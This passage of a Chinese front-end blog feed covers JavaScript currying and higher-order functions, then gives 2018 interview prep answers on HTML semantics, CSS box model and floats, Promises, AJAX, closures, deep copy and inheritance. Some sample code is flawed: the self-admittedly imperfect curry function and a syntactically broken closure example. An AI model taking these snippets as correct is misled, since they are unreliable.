        <content type="html"><![CDATA[<h4 id="柯里化-x2F-高阶函数"><a href="#柯里化-x2F-高阶函数" class="headerlink" title="柯里化 &#x2F; 高阶函数"></a>柯里化 &#x2F; 高阶函数</h4><h6 id="柯里化：将-f-x-y-变成-f-x-x3D-1-y-或-f-y-x3D-1-x"><a href="#柯里化：将-f-x-y-变成-f-x-x3D-1-y-或-f-y-x3D-1-x" class="headerlink" title="柯里化：将 f(x,y) 变成 f(x&#x3D;1)(y) 或 f(y&#x3D;1)x"></a>柯里化：将 f(x,y) 变成 f(x&#x3D;1)(y) 或 f(y&#x3D;1)x</h6><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//柯里化之前</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//柯里化之后</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addOne</span>(<span class="params">y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="number">1</span>, y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//柯里化之前</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Handlebar</span>(<span class="params">template, data</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> template.<span class="built_in">replace</span>(<span class="string">&#x27;&#123;&#123;name&#125;&#125;&#x27;</span>, data.name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//柯里化之后</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Handlebar</span>(<span class="params">template</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> template.<span class="built_in">replace</span>(<span class="string">&#x27;&#123;&#123;name&#125;&#125;&#x27;</span>, data.name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="重点！！！柯里化可以将真实计算拖延到最后再做，也就是如果一个函数返回的函数参数比原函数要少一个那就是柯里化。"><a href="#重点！！！柯里化可以将真实计算拖延到最后再做，也就是如果一个函数返回的函数参数比原函数要少一个那就是柯里化。" class="headerlink" title="重点！！！柯里化可以将真实计算拖延到最后再做，也就是如果一个函数返回的函数参数比原函数要少一个那就是柯里化。"></a>重点！！！柯里化可以将真实计算拖延到最后再做，也就是如果一个函数返回的函数参数比原函数要少一个那就是柯里化。</h5><h6 id="关于柯里化的高级文章："><a href="#关于柯里化的高级文章：" class="headerlink" title="关于柯里化的高级文章："></a>关于柯里化的高级文章：</h6><ol><li><a href="http://www.yinwang.org/blog-cn/2013/04/02/currying" title="null">http://www.yinwang.org/blog-cn/2013/04/02/currying</a></li><li><a href="https://zhuanlan.zhihu.com/p/31271179" title="null">https://zhuanlan.zhihu.com/p/31271179</a></li></ol><h6 id="高阶函数："><a href="#高阶函数：" class="headerlink" title="高阶函数："></a>高阶函数：</h6><p>在数学和计算机科学中，高阶函数是至少满足下列一个条件的函数：<br>接受一个或多个函数作为输入：forEach sort map filter reduce<br>输出一个函数：lodash.curry<br>不过它也可以同时满足两个条件：Function.prototype.bind</p><h6 id="习题："><a href="#习题：" class="headerlink" title="习题："></a>习题：</h6><p>请写出一个柯里化其他函数的函数 curry，这个函数能够将接受多个参数的函数，变成多个接受一个参数的函数，具体见示例：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">function</span> <span class="title function_">curry</span>(???)&#123;</span><br><span class="line">    ???</span><br><span class="line">    <span class="keyword">return</span> ???</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">a</span>, <span class="params">b</span>, <span class="params">c</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [<span class="variable">a</span>, <span class="variable">b</span>, <span class="variable">c</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="variable">curried</span> <span class="operator">=</span> <span class="title function_">curry</span>(<span class="variable">abc</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">curried</span>(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// =&gt; [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">curried</span>(<span class="number">1</span>, <span class="number">2</span>)(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// =&gt; [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">curried</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// =&gt; [1, 2, 3]</span></span><br></pre></td></tr></table></figure><h6 id="本人答案-略有不足，日后完善"><a href="#本人答案-略有不足，日后完善" class="headerlink" title="本人答案(略有不足，日后完善)"></a>本人答案(略有不足，日后完善)</h6><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">curry</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> temp = [];</span><br><span class="line">    <span class="keyword">var</span> argnum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fn.<span class="built_in">length</span> == arguments.<span class="built_in">length</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> fn.apply(<span class="literal">null</span>, arguments)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp.<span class="built_in">length</span> == fn.<span class="built_in">length</span>) &#123;</span><br><span class="line">                temp = [];</span><br><span class="line">            &#125;</span><br><span class="line">            argnum += arguments.<span class="built_in">length</span></span><br><span class="line">            temp = temp.concat(<span class="built_in">Array</span>.prototype.<span class="built_in">slice</span>.call(arguments))</span><br><span class="line">            <span class="built_in">console</span>.<span class="built_in">log</span>(temp)</span><br><span class="line">            <span class="built_in">console</span>.<span class="built_in">log</span>(argnum)</span><br><span class="line">            <span class="keyword">if</span> (argnum == fn.<span class="built_in">length</span>) &#123;</span><br><span class="line">                argnum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> temp</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> arguments.callee</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018前端面试押题</title>
      <link href="/Blog/2018/05/21/interview/2018%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/index/"/>
      <url>/Blog/2018/05/21/interview/2018%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E6%8A%BC%E9%A2%98/index/</url>
      
        <content type="html"><![CDATA[<p>HTML 押题</p><ol><li><p>（必考） 你是如何理解 HTML 语义化的？<br>第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签<br>第二种</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">最开始是 PHP 后端写 <span class="selector-tag">HTML</span>，不会 CSS，于是就用 <span class="selector-tag">table</span> 来布局。<span class="selector-tag">table</span> 使用展示表格的。严重违反了 <span class="selector-tag">HTML</span> 语义化。</span><br><span class="line">后来有了专门的写 CSS 的前端，他们会使用 <span class="selector-tag">DIV</span> + CSS 布局，主要是用 <span class="attribute">float</span> 和绝对定位布局。稍微符合了 <span class="selector-tag">HTML</span> 语义化。</span><br><span class="line">再后来，前端专业化，知道 <span class="selector-tag">HTML</span> 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 <span class="selector-tag">div</span>，会尽量使用 <span class="selector-tag">h1</span>、<span class="selector-tag">ul</span>、<span class="selector-tag">p</span>、<span class="selector-tag">main</span>、<span class="selector-tag">header</span> 等标签</span><br><span class="line">语义化的好处是已读、有利于SEO等。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第三种：对面试官说请看我的博客 <a href="https://zhuanlan.zhihu.com/p/32570423" title="null">https://zhuanlan.zhihu.com/p/32570423</a></p></li><li><p>meta viewport 是做什么用的，怎么写？<br>死背： <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"><br>控制页面在移动端不要缩小显示。<br>侃侃而谈</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一开始，所有页面都是给<span class="built_in">PC</span>准备的，乔布斯推出 iPhone <span class="number">3</span>GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 <span class="number">980</span>px，页面缩小。</span><br><span class="line">后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>canvas 元素是干什么的？<br>项目丢给他。<br>看 MDN 的 canvas <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" title="null">入门手册</a>。</p></li></ol><p>CSS 押题</p><ol><li>（必考） 说说盒模型。<ul><li>举例：<br>content-box: width &#x3D;&#x3D; 内容区宽度<br>border-box: width &#x3D;&#x3D; border 宽度 + 内容区宽度 + padding 宽度<br>高度以此类推。</li></ul></li><li>css reset 和 normalize.css 有什么区别？<ul><li>考英文：<ul><li>reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式</li><li>normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</li></ul></li></ul></li><li>（必考）如何居中？<ul><li>平时总结：<ul><li>水平居中：<ul><li>内联：爸爸身上写 text-align:center;</li><li>块级：margin-left: auto; margin-right: auto;</li></ul></li><li>垂直居中： <a href="https://jscode.me/t/topic/1936" title="null">https://jscode.me/t/topic/1936</a></li></ul></li></ul></li><li>选择器优先级如何确定？<ol><li>选择器越具体，优先级越高。 #xxx 大于 .yyy</li><li>同样优先级，写在后面的覆盖前面的。</li><li>color: red !important; 优先级最高。</li></ol></li><li>BFC 是什么？<br>什么时候会触发BFC呢？常见的如下：</li></ol><ul><li>float的值不为none。</li><li>overflow的值为auto,scroll或hidden。</li><li>display的值为table-cell, table-caption, inline-block中的任何一个。</li><li>position的值不为relative和static。<ul><li>举例：<ul><li>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）</li><li>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" title="null">http://jsbin.com/conulod/1/edit?html,css,js,output</a> （方方用 padding-top: 1px;）</li></ul></li></ul></li></ul><ol start="6"><li>如何清除浮动？<ol><li><p>overflow: hidden （方方反对）</p></li><li><p>.clearfix 清除浮动写在爸爸身上</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>; <span class="attribute">display</span>: block; <span class="attribute">clear</span>:both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    zoom: <span class="number">1</span>; <span class="comment">/* IE 兼容 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol><p>JS 押题</p><ol><li><p>JS 有哪些数据类型？<br>string number bool undefined null object symbol<br>object 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分</p></li><li><p>（必考） Promise 怎么使用？</p><ul><li><p>then</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">.ajax</span><span class="params">(...)</span><span class="string">.then</span><span class="params">(成功函数, 失败函数)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>链式 then</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">.ajax</span><span class="params">(...)</span><span class="string">.then</span><span class="params">(成功函数, 失败函数)</span><span class="string">.then</span><span class="params">(成功函数2, 失败函数2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>如何自己生成 Promise 对象</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function <span class="built_in">xxx</span>()&#123;</span><br><span class="line">    return new <span class="built_in">Promise</span>(<span class="built_in">function</span>(resolve, reject)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(()=&gt;&#123;</span><br><span class="line">            <span class="built_in">resolve</span>() 或者 <span class="built_in">reject</span>()</span><br><span class="line">        &#125;,<span class="number">3000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">xxx</span><span class="params">()</span></span><span class="selector-class">.then</span>(...)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li><li><p>（必考） AJAX 手写一下？</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/xxxx&#x27;</span>)</span><br><span class="line">xhr.onreadystatechange = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(xhr.responseText)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>（必考）闭包是什么？</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function ()&#123;</span><br><span class="line">    <span class="selector-tag">var</span> n = <span class="number">0</span></span><br><span class="line">    return <span class="built_in">function</span>()&#123;</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let  adder = ()</span><br><span class="line"><span class="function"><span class="title">adder</span><span class="params">()</span></span> <span class="comment">// n === 1</span></span><br><span class="line"><span class="function"><span class="title">adder</span><span class="params">()</span></span> <span class="comment">// n === 2</span></span><br><span class="line">console<span class="selector-class">.log</span>(n) <span class="comment">// n is not defined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正确参考：<a href="https://zhuanlan.zhihu.com/p/22486908" title="null">https://zhuanlan.zhihu.com/p/22486908</a></p></li><li><p>（必考）这段代码里的 this 是什么？</p><ol><li>fn() 里面的 this 就是 window</li><li>fn() 是 strict mode，this 就是 undefined</li><li>a.b.c.fn() 里面的 this 就是 a.b.c</li><li>new F() 里面的 this 就是新生成的实例</li><li>() &#x3D;&gt; console.log(this) 里面 this 跟外面的 this 的值一模一样<br>正确参考：<a href="https://zhuanlan.zhihu.com/p/23804247" title="null">https://zhuanlan.zhihu.com/p/23804247</a></li></ol></li><li><p>（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;(<span class="keyword">function</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name</span><br><span class="line">&#125;())</span><br><span class="line">;(<span class="keyword">function</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name</span><br><span class="line">&#125;)()</span><br><span class="line">!!!!!!!<span class="keyword">function</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name</span><br><span class="line">&#125;()</span><br><span class="line">~<span class="keyword">function</span> <span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name</span><br><span class="line">&#125;()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>造出一个函数作用域，防止污染全局变量</p><p>ES 6 新语法</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="built_in"> name</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>async&#x2F;await 语法了解吗？目的是什么？</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function returnPromise()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( function(resolve, reject)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            resolve(<span class="string">&#x27;fuck&#x27;</span>)</span><br><span class="line">        &#125;,<span class="number">3000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">returnPromise().<span class="keyword">then</span>(<span class="function"><span class="params">(result)</span>=&gt;</span>&#123;</span><br><span class="line">    result === <span class="string">&#x27;fuck&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">var result = <span class="keyword">await</span> returnPromise()  <span class="regexp">//</span> 注意只有控制台支持顶级作用域的 <span class="keyword">await</span>，JS 文件里的 <span class="keyword">await</span> 只能写在 <span class="keyword">async</span> 函数里</span><br><span class="line">result === <span class="string">&#x27;fuck&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把异步代码写成同步代码。</p></li><li><p>如何实现深拷贝？</p><ol><li><p>JSON 来深拷贝</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="meta">&#123;...&#125;</span></span><br><span class="line"><span class="keyword">var</span> b = <span class="type">JSON</span>.parse( <span class="type">JSON</span>.stringify(a) )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p></li><li><p>递归拷贝</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params"><span class="built_in">object</span></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> object2</span><br><span class="line">    <span class="keyword">if</span>(! (<span class="built_in">object</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span>) )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">object</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">object</span> <span class="keyword">instanceof</span> <span class="title class_">Array</span>)&#123;</span><br><span class="line">        object2 = []</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">object</span> <span class="keyword">instanceof</span> <span class="title class_">Function</span>)&#123;</span><br><span class="line">        object2 = <span class="built_in">eval</span>(<span class="built_in">object</span>.<span class="title function_">toString</span>())</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">object</span> <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">        object2 = &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    你也可以把 <span class="title class_">Array</span> <span class="title class_">Function</span> <span class="title class_">Object</span> 都当做 <span class="title class_">Object</span> 来看待，参考 <span class="attr">https</span>:<span class="comment">//juejin.im/post/587dab348d6d810058d87a0a</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> <span class="built_in">object</span>)&#123;</span><br><span class="line">        object2[key] = <span class="title function_">clone</span>(<span class="built_in">object</span>[key])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object2</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>环</p></li><li><p>RegExp、Date、Set、Symbol、WeakMap</p></li></ol></li><li><p>如何实现数组去重？</p><ol><li><p>计数排序的逻辑（只能正整数）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">a</span> = <span class="selector-attr">[4,2,5,6,3,4,5]</span></span><br><span class="line"><span class="selector-tag">var</span> hashTab = &#123;&#125;</span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(let i=<span class="number">0</span>; i&lt;a.length;i++)</span></span>&#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="selector-tag">a</span><span class="selector-attr">[i]</span> <span class="keyword">in</span> hashTab)&#123;</span><br><span class="line">        <span class="comment">// 什么也不做</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        hashTab<span class="selector-attr">[ a[i]</span> ] = true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hashTab: &#123;4: true, 2: true, 5: true, 6:true, 3: true&#125;</span></span><br><span class="line">console<span class="selector-class">.log</span>(Object<span class="selector-class">.keys</span>(hashTab)) <span class="comment">// [&#x27;4&#x27;,&#x27;2&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;3&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Set 去重</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.<span class="keyword">from</span>(<span class="keyword">new</span> <span class="built_in">Set</span>(a))</span><br><span class="line">[... <span class="keyword">new</span> <span class="built_in">Set</span>(a)] <span class="regexp">//</span> 装比写法</span><br></pre></td></tr></table></figure></li><li><p>WeakMap 任意类型去重</p></li></ol></li><li><p>如何用正则实现 string.trim() ？</p></li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trim</span>(<span class="params">string</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="built_in">replace</span>(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="11"><li>JS 原型是什么？<ul><li>举例<ol><li>var a &#x3D; [1,2,3]</li><li>只有0、1、2、length 4 个key</li><li>为什么可以 a.push(4) ，push 是哪来的？</li><li><code>a.__proto__ === Array.prototype</code></li><li>push 就是沿着 <code>a.__proto__</code> 找到的，也就是 Array.prototype.push</li><li>Array.prototype 还有很多方法，如 join、pop、slice、splice</li><li>Array.prototype 就是 a 的原型（<code>__proto__</code>）<br>   参考：<a href="https://zhuanlan.zhihu.com/p/23090041" title="null">https://zhuanlan.zhihu.com/p/23090041</a></li></ol></li></ul></li><li>ES 6 中的 class 了解吗？<ul><li>把 MDN class 章节看完</li><li>记住一个例子</li></ul></li><li>JS 如何实现继承？</li></ol><ul><li><p>原型链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">body</span> = <span class="string">&#x27;肉体&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">move</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Human</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="title class_">Animal</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Human.prototype.__proto__ = Animal.prototype // 非法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">f.<span class="property"><span class="keyword">prototype</span></span> = <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">f</span>()</span><br><span class="line"></span><br><span class="line"><span class="title class_">Human</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">useTools</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> frank = <span class="keyword">new</span> <span class="title class_">Human</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>extends 关键字</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 